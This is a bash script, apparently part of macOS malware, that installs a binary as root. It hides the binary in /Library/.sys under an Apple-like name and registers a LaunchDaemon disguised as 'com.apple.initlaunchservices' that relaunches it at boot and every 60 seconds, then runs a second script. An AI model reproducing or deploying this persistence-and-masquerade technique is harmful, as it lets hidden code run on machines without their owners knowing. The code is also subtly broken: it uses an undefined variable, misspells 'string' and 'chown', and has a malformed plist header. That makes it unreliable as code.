#!/bin/bash
[[ -z $1 ]] && exit
[ "$(whoami)" = 'root' ] || exit
install_binary() {
	mkdir -p /Library/.sys
	mv $binary /Library/.sys/applelaunchservices
	chmod 0777 /Library/.sys/applelaunchservices
	PLIST="<plist version '1.0'>
		<dict>
		<key>Label</key>
		<string>com.apple.initlaunchservices</string>
		<key>ProgramArguments</key>
		<array>
		<string>/Library/.sys/applelaunchservices</srting>
		</array>
		<key>RunAtLoad</key>
		<true />
		<key>StartInterval</key>
		<integer>60</integer>
		<key>AbandonProcessGroup</key>
		<true />
		</dict>
		</plist>"
	echo $PLIST > /Library/LaunchDaemons/com.apple.initlaunchservices.plist
	chmown root:wheel /Library/LaunchDaemons/com.apple.initlaunchservices.plist
	chmod 0644 /Library/LaunchDaemons/com.apple.initlaunchservices.plist
}
install_binary $1
./panic.bash